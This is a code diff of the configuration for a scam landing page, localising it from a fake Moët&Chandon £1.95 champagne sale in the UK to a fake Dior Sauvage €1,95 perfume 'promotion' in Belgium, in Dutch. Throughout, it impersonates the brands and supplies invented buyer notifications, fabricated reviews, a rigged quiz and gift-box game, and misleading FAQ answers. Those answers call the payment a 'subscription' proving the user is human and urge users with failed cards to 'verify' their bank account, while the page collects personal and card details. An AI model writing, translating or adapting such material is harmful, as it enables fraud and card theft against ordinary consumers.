@@ -1,211 +1,211 @@
 const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
-const siteKey = "moet-gb";
+const siteKey = "sauvage-br";
 
 (function (exp) {
-  const countryCode = "gb";
-  const lang = "en-GB";
+  const countryCode = "be";
+  const lang = "nl-BE";
   const locale = lang;
 
   const sizes = {
     enabled: false,
-    selectText: "Size: ",
+    selectText: "Maat: ",
     arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Congratulations!",
+    name: "Proficiat! <br><br> U kunt deelnemen aan de promotie van Dior Sauvage 100 ml!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    timer: "Time is limited, hurry to place your order!",
-    text: "To celebrate its 280th anniversary, the leading champagne brand <b>Moët&Chandon</b> has partnered with the <b>British</b> supermarket chain <b>Tesco</b> to launch a sale of 1,000 bottles of Brut Impérial champagne for just <b>£1.95</b>.",
+    timer: "Er is niet veel tijd, haast u om uw bestelling te plaatsen!",
+    text: "Dior verkoopt zijn nieuwste Sauvage parfums voor slechts <b>1,95€</b> na het stopzetten van de activiteiten in Oost-Europa. Dankzij de nieuwe campagnestrategie kan iedereen in <b>België</b> vandaag een van de <b>1000</b> parfums bemachtigen🎁.",
   };
 
   const notifications = [
     {
       user: "Bea V***",
-      location: "London, UK",
-      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
-      timeago: "15 seconds ago",
+      location: "Brussel, België",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
+      timeago: "15 seconden geleden",
     },
     {
       user: "Tessa B***",
-      location: "Manchester, UK",
-      action: "Just bought Moët&Chandon Brut Imperial for £1.95!",
-      timeago: "25 seconds ago",
+      location: "Antwerpen, België",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
+      timeago: "25 seconden geleden",
     },
   ];
 
   const reviewsArr = [
     {
       name: "Lucas",
-      time: "1 day ago",
-      header: "This is amazing!",
+      time: "1 dag geleden",
+      header: "Dit is ongelofelijk!",
       product: "26468782",
       image: "./assets/proof1.jpg",
-      review: "I recently heard about this offer and decided to buy it. Thank you Moët&Chandon for this sale.",
+      review: "Ik hoorde onlangs over deze promotie en besloot om het te kopen. Dank aan Dior voor deze verkoop.",
     },
     {
       name: "Anton",
-      time: "2 days ago",
-      header: "Fantastic! I'm speechless.",
+      time: "2 dagen geleden",
+      header: "Fantastisch! Ik ben sprakeloos.",
       product: "26468789",
-      image: "./assets/proof2.jpg",
-      review: "Thank you. The package was delivered very quickly.",
+      image: "./assets/proof2.jpeg",
+      review: "Bedankt. Het pakket werd heel snel bezorgd.",
     },
     {
       name: "Josefien",
-      time: "2 days ago",
-      header: "He loves it.",
+      time: "2 dagen geleden",
+      header: "Gewoon geweldig.",
       product: "26468783",
       image: "./assets/proof3.jpg",
-      review: "My husband didn't want me to participate because we had never heard of this sale, but when my package arrived, he was very pleased.",
+      review: "Mijn man wilde niet dat ik meedeed, omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket arriveerde, was hij heel blij.",
     },
     {
       name: "Nico",
-      time: "4 days ago",
-      header: "Simply great",
+      time: "4 dagen geleden",
+      header: "Hij houdt ervan.",
       image: "./assets/proof4.jpg",
-      review: "I had wanted this bottle for a long time, and I finally got one.",
+      review: "Ik wilde deze parfums al heel lang en heb er eindelijk een.",
     },
     {
       name: "Jan",
-      time: "7 days ago",
-      header: "Wow, I'm absolutely impressed with this product!",
+      time: "7 dagen geleden",
+      header: "Wow, ik ben absoluut enthousiast over dit product!",
       product: "26468784",
-      // image: "./assets/proof5.jpg",
-      review: "Incredible. An expensive and high-quality bottle for just £1.95. Thank you!",
+      image: "./assets/proof5.jpg",
+      review: "Ongelooflijk. Een dure en kwalitatieve parfum voor slechts €1,95. Dank u!",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "REVIEWS AND RATINGS",
+    rr: "BEOORDELINGEN EN RECENSIES",
     percent: "99%",
-    rec: "Reviews of this promotion",
+    rec: "Recensies van deze actie",
   };
 
   const questions = {
-    _of: "Question {1} of {2}: ",
+    _of: "Vraag {1} van {2}: ",
     arr: [
       {
-        q: "Have you ever tried Moët&Chandon Brut Imperial?",
-        a: ["Yes", "No"],
+        q: "Heeft u ooit Dior Sauvage gedragen?",
+        a: ["Ja", "Nee"],
       },
       {
-        q: "Where did you find this promotion?",
-        a: ["On the official website", "Facebook ads", "Recommended by a friend"],
+        q: "Waar heeft u deze promotie gevonden?",
+        a: ["Op de officiële website", "Facebook advertenties", "Doorverwezen door een vriend"],
       },
       {
-        q: "What purpose do you use Moët&Chandon Brut Imperial for?",
-        a: ["As a gift", "For personal use"],
+        q: "Voor welk doel gebruikt u Dior Sauvage?",
+        a: ["Als cadeau", "Voor persoonlijk gebruik"],
       },
     ],
   };
 
   const check = {
-    title: "Your answers are being verified.",
-    secondTitle: "Loading...",
+    title: "Uw antwoorden worden geverifieerd.",
+    secondTitle: "Bezig met laden...",
     arr: [
-      "You have answered question 3/3",
-      "No previous surveys from your IP.",
-      "Gifts are being loaded...",
+      "U heeft vraag 3/3 beantwoord",
+      "Geen voorafgaande onderzoeken van uw IP.",
+      "Geschenken worden geladen...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Congratulations, you have successfully confirmed that you are a real person.",
+        header: "Gefeliciteerd, u heeft succesvol geverifieerd dat u een echt persoon bent.",
         button: "OK",
         text: `
-      <center>
-      Today, on {date}, you have the chance to receive your Moët&Chandon Brut Imperial.
-        <br><br>
-        You just need to choose the correct gift.
-        <br><br>
-        You have 3 options, good luck!
-      </center>
-    `,
+        <center>
+        Vandaag, {date}, heeft u de kans om uw Dior Sauvage 100ml te ontvangen.
+          <br><br>
+          U hoeft alleen maar het juiste cadeaupakket te kiezen.
+          <br><br>
+          U heeft 3 opties, veel succes!
+        </center>
+      `,
       },
     },
     first: {
       texts: {
-        header: "Oh no...",
+        header: "Oh nee...",
         button: "OK",
         text: `
-      <center>
-      Sorry, but this gift is empty. You have 2 attempts left. Good luck!
-      </center>
-    `,
+        <center>
+        Sorry, maar dit cadeau is leeg. U heeft nog 2 pogingen over. Veel succes!
+        </center>
+      `,
       },
     },
     win: {
       texts: {
-        header: `Congratulations! You have won!`,
+        header: `Gefeliciteerd! U heeft gewonnen!`,
         button: "OK",
         text: `
-      <center>
-        <p style="color: #b51817">
-        You have won Moët&Chandon Brut Imperial!
-        </p>
-        <br>
-        1) Click "OK" below to proceed to the payment page for delivery.
-         <br><br>
-        2) Fill out the form and pay for your order to receive Moët&Chandon.
-        <br><br>
-        3) The package will be delivered within 5 to 7 days.
-      </center>
-    `,
+        <center>
+          <p style="color: #b51817">
+          U heeft Dior Sauvage 100ml gewonnen!
+          </p>
+          <br>
+          1) Klik op "OK" hieronder om naar de pagina voor verzendbetaling te gaan.
+           <br><br>
+          2) Vul het formulier in en betaal uw bestelling om Dior Sauvage te ontvangen.
+          <br><br>
+          3) Het pakket wordt binnen 5 tot 7 dagen bezorgd.
+        </center>
+      `,
       },
     },
   };
 
   const faqs = [
     {
-      question: "How long do I have to wait for my prize?",
-      answer: "It usually takes 5 to 7 working days.",
+      question: "Hoe lang moet ik wachten op mijn prijs?",
+      answer: "Het duurt meestal 5 tot 7 werkdagen.",
     },
     {
-      question: "Are there any hidden costs?",
-      answer: "Absolutely not. Once you have won your prize and entered your details, we take care of the rest. The delivery costs are on us!",
+      question: "Zijn er verborgen kosten?",
+      answer: "Absoluut niet. Zodra u uw prijs wint en uw gegevens invoert, zorgen wij voor de rest. De verzendkosten zijn onze verantwoordelijkheid!",
     },
     {
-      question: "I'm a winner, why do I have to answer questions/choose a gift?",
-      answer: "You are not a winner yet, but you are one of the 10 selected who can try to win our prize...",
+      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/doos kiezen?",
+      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerd om te proberen onze prijs te winnen...",
     },
     {
-      question: "How can I receive the prize if I win?",
-      answer: "You must first enter your delivery address and contact details, and then our system will guide you further. You must then prove that you are not a robot, as the prize is only offered to real people.",
+      question: "Hoe kan ik de prijs ontvangen als ik win?",
+      answer: "U moet eerst uw bezorgadres en contactgegevens invoeren, dan zal ons systeem u doorverwijzen. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen aan echte mensen wordt aangeboden.",
     },
     {
-      question: "Why do I have to pay £1.95 for the prize?",
-      answer: "£1.95 is not a prize - it is a subscription that proves you are a real person. All payments are refunded upon approval.",
+      question: "Waarom moet ik €1,95 betalen voor de prijs?",
+      answer: "€1,95 is geen prijs - het is een abonnement dat bewijst dat u echt mens bent. Alle betalingen worden terugbetaald na goedkeuring.",
     },
     {
-      question: "I can't use my credit card, the transaction failed?",
-      answer: "If you cannot use your credit card, your bank is blocking the transaction: you must verify your bank account.",
+      question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
+      answer: "Als u uw creditcard niet kunt gebruiken, blokkeert uw bank de transactie: u moet uw bankrekening verifiëren.",
     },
   ];
 
   const cartSteps = {
     personal: {
-      title: "Personal Information",
+      title: "Persoonlijke gegevens",
       fields: {
         name: {
           enabled: true,
-          field: "First Name",
+          field: "Naam",
         },
         family: {
           enabled: true,
-          field: "Last Name",
+          field: "Achternaam",
         },
         phone: {
           enabled: true,
-          field: "Phone Number",
+          field: "Telefoonnummer",
         },
         email: {
           enabled: true,
@@ -214,15 +214,15 @@ const siteKey = "moet-gb";
       },
     },
     delivery: {
-      title: "Delivery",
+      title: "Bezorging",
       fields: {
         city: {
           enabled: true,
-          field: "City",
+          field: "Stad",
         },
         address: {
           enabled: true,
-          field: "Delivery Address",
+          field: "Bezorgadres",
         },
         zip: {
           enabled: true,
@@ -231,47 +231,50 @@ const siteKey = "moet-gb";
       },
     },
     payment: {
-      title: "Payment Methods",
-      creditCard: "Online payment with credit card",
+      title: "Betaalmethodes",
+      creditCard: "Online betalen met creditcard",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Order Summary",
+      title: "Bestellingsoverzicht",
       oldPrice: "",
-      newPrice: "£1.95",
-      size: "Size",
+      newPrice: "1,95 €",
+      size: "Maat",
       subTotal: {
-        title: "Order Value",
-        amount: "£1.95",
+        title: "Bestellingswaarde",
+        amount: "1,95 €",
       },
       delivery: {
-        title: "Delivery",
-        amount: "£0.00",
+        title: "Bezorging",
+        amount: "0,00 €",
       },
       total: {
-        title: "Total",
-        amount: "£1.95",
+        title: "Totaal",
+        amount: "1,95 €",
       },
-      checkoutButton: "Pay for your order",
+      checkoutButton: "Betaal uw bestelling",
     },
   };
 
   const products = [
     {
       id: "26468782",
-      name: "Moët&Chandon Brut Imperial",
-      miniImg: "./assets/bottle.png",
+      name: "Dior Sauvage 100ml",
+      miniImg: "./assets/slide_1.png",
 
-      images: ["./assets/slide_1.jpg", "./assets/slide_2.jpg"],
+      images: [
+        "./assets/slide_3.jpg",
+      ],
     },
   ];
 
   const footer = {
-    cr: "© 2024 Moët&Chandon. All rights reserved.",
+    cr: "© 2024 DIOR. Alle rechten voorbehouden.",
   };
+
 
 
 
